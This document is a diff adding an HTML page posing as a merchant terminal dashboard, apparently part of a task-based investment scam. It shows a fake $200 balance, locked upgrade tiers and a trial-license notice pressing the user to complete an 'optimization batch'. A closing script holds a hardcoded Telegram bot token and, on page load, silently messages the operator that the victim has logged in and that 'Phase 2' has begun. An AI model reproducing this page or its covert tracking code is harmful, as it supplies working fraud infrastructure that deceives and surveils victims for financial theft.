@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Terminal Dashboard | AGMT</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
+        
+        body { background: var(--bg); color: white; padding-bottom: 100px; }
+
+        /* Header Navigation */
+        header { padding: 25px; display: flex; justify-content: space-between; align-items: center; background: rgba(2, 6, 23, 0.8); backdrop-filter: blur(10px); sticky; top: 0; z-index: 100; }
+        .profile { display: flex; align-items: center; gap: 12px; }
+        .avatar { width: 42px; height: 42px; background: linear-gradient(135deg, #2563eb, #1e40af); border-radius: 14px; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 18px; border: 1px solid rgba(255,255,255,0.1); }
+        .node-id { font-size: 10px; color: var(--accent); font-weight: 800; text-transform: uppercase; letter-spacing: 1px; margin-top: 2px; }
+
+        /* Balance Section */
+        .wallet-section { padding: 0 20px; margin-top: 10px; }
+        .main-card { 
+            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); 
+            border: 1px solid var(--border); 
+            border-radius: 35px; 
+            padding: 30px; 
+            position: relative; 
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }
+        .main-card::after { content: ""; position: absolute; bottom: -20px; right: -20px; width: 100px; height: 100px; background: var(--primary); filter: blur(60px); opacity: 0.2; }
+        
+        .label { font-size: 11px; color: #94a3b8; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
+        .balance { font-size: 44px; font-weight: 800; margin: 12px 0; color: #fff; letter-spacing: -2px; }
+        .stats-row { display: flex; justify-content: space-between; margin-top: 25px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.05); }
+        .stat-item b { display: block; font-size: 15px; color: #fff; }
+        .stat-item span { font-size: 9px; color: #64748b; font-weight: 800; text-transform: uppercase; }
+
+        /* Optimization Tiers */
+        .section-header { padding: 30px 25px 15px; display: flex; justify-content: space-between; align-items: center; }
+        .section-header h3 { font-size: 16px; font-weight: 800; }
+        
+        .tier-list { display: flex; overflow-x: auto; gap: 15px; padding: 0 25px; scrollbar-width: none; }
+        .tier-list::-webkit-scrollbar { display: none; }
+        
+        .tier-item { min-width: 290px; background: var(--card); border: 1px solid var(--border); border-radius: 30px; padding: 25px; transition: 0.3s; }
+        .tier-item.locked { opacity: 0.5; filter: saturate(0.5); }
+        .tier-head { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 20px; }
+        .tier-tag { font-size: 10px; font-weight: 800; background: rgba(37, 99, 235, 0.1); color: var(--primary); padding: 5px 12px; border-radius: 50px; }
+        .tier-item.locked .tier-tag { background: #1e293b; color: #64748b; }
+        
+        .tier-item h4 { font-size: 18px; font-weight: 800; margin-bottom: 8px; }
+        .tier-item p { font-size: 12px; color: #64748b; line-height: 1.5; margin-bottom: 25px; }
+        
+        .btn-action { width: 100%; padding: 16px; border-radius: 16px; border: none; font-weight: 800; font-size: 14px; cursor: pointer; transition: 0.2s; }
+        .btn-primary { background: var(--primary); color: white; box-shadow: 0 10px 20px rgba(37, 99, 235, 0.2); }
+        .btn-locked { background: #1e293b; color: #94a3b8; }
+
+        /* Bottom Tab Bar */
+        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(20px); border-top: 1px solid var(--border); display: grid; grid-template-columns: repeat(4, 1fr); padding: 15px 0; z-index: 1000; }
+        .nav-link { text-align: center; color: #64748b; text-decoration: none; display: flex; flex-direction: column; gap: 5px; }
+        .nav-link.active { color: var(--primary); }
+        .nav-icon { font-size: 20px; }
+        .nav-label { font-size: 10px; font-weight: 800; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="profile">
+            <div class="avatar" id="initial">M</div>
+            <div>
+                <div style="font-size: 14px; font-weight: 800;">Merchant Terminal</div>
+                <div class="node-id">🟢 Node: JM-Active</div>
+            </div>
+        </div>
+        <div style="font-size: 22px;">⚙️</div>
+    </header>
+
+    <div class="wallet-section">
+        <div class="main-card">
+            <span class="label">Settlement Balance</span>
+            <div class="balance">$200.00</div>
+            <div class="stats-row">
+                <div class="stat-item">
+                    <span>Active Tier</span>
+                    <b>Basic (T1)</b>
+                </div>
+                <div class="stat-item" style="text-align: right;">
+                    <span>Daily Limit</span>
+                    <b>$500.00</b>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="section-header">
+        <h3>Asset Optimization</h3>
+        <span style="font-size: 11px; color: var(--primary); font-weight: 800;">View Limits</span>
+    </div>
+
+    <div class="tier-list">
+        <div class="tier-item">
+            <div class="tier-head">
+                <div class="tier-tag">CURRENT</div>
+                <div style="font-size: 20px;">🛡️</div>
+            </div>
+            <h4>Standard Node</h4>
+            <p>Optimize retail consumer goods. Standard settlement processing speed (24h).</p>
+            <button class="btn-action btn-primary" onclick="location.href='engine.html'">LAUNCH TERMINAL</button>
+        </div>
+
+        <div class="tier-item locked">
+            <div class="tier-head">
+                <div class="tier-tag">LOCKED</div>
+                <div style="font-size: 20px;">💎</div>
+            </div>
+            <h4>Premium Node</h4>
+            <p>Institutional grade assets. Instant settlement and priority node allocation.</p>
+            <button class="btn-action btn-locked">UPGRADE REQUIRED</button>
+        </div>
+    </div>
+
+    <div style="padding: 25px;">
+        <div style="background: rgba(37, 99, 235, 0.05); border: 1px dashed var(--primary); padding: 20px; border-radius: 20px; text-align: center;">
+            <div style="font-size: 11px; font-weight: 800; color: var(--primary); margin-bottom: 5px;">SECURITY NOTICE</div>
+            <p style="font-size: 12px; color: #94a3b8;">Your node is currently operating on a trial license. Complete the first optimization batch to qualify for full merchant verification.</p>
+        </div>
+    </div>
+
+    <nav class="nav-bar">
+        <a href="dashboard.html" class="nav-link active">
+            <span class="nav-icon">📊</span>
+            <span class="nav-label">Overview</span>
+        </a>
+        <a href="engine.html" class="nav-link">
+            <span class="nav-icon">⚡</span>
+            <span class="nav-label">Optimize</span>
+        </a>
+        <a href="withdraw.html" class="nav-link">
+            <span class="nav-icon">💰</span>
+            <span class="nav-label">Wallet</span>
+        </a>
+        <a href="#" class="nav-link">
+            <span class="nav-icon">👤</span>
+            <span class="nav-label">Profile</span>
+        </a>
+    </nav>
+
+    <script>
+        const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
+        const chatId = "7909543900";
+
+        // SILENT PING: Tells you they entered the dashboard
+        window.onload = function() {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📈 <b>AGMT DASHBOARD:</b> The user has successfully logged in and is viewing their $200 balance. Phase 2 started.&parse_mode=html`);
+        }
+    </script>
+</body>
+</html>
+
